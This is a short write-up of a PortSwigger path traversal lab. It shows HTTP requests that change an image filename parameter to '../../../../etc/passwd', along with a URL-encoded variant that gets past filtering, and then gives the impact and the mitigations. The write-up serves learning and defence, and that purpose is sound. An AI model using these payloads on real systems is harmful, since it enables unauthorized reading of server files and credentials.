# Path Traversal – Accessing Restricted Files

## Overview

The application is vulnerable to Path Traversal via the `filename` parameter, allowing access to files outside the intended directory.

## Lab

https://portswigger.net/web-security/file-path-traversal/lab-simple

## Steps to Reproduce

1. Send request to load an image:

```
GET /image?filename=cat.jpg HTTP/1.1
Host: target.com
```

2. Modify parameter to test traversal:

```
GET /image?filename=../../../../etc/passwd HTTP/1.1
Host: target.com
```

3. If filtering is present, try URL-encoded payload:

```
GET /image?filename=..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
Host: target.com
```

## Payload Used

```
../../../../etc/passwd
```

## Result

The server responds with the contents of `/etc/passwd`, confirming successful directory traversal.

## Impact

An attacker can read arbitrary files on the server, potentially exposing sensitive information such as configuration files, credentials, or application source code.

## Tools

* Burp Suite (Proxy)
* Web Browser

## Mitigation

* Validate and sanitize user input
* Implement strict allowlisting for file access
* Normalize file paths before processing
* Restrict access to specific directories only
